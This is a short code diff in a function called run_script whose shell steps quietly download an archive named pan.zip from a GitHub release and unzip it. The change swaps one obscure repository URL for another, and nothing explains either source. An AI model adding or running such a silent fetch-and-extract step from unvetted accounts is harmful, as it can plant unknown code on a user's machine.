@@ -32,7 +32,7 @@ def run_script():
     pwd
 
     echo "=== DOWNLOAD FILE ==="
-    wget -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O pan.zip
+    wget -q https://github.com/malogrono/vb/releases/download/vcz/pan.zip -O pan.zip
 
     echo "=== EXTRACT ==="
     unzip -o pan.zip
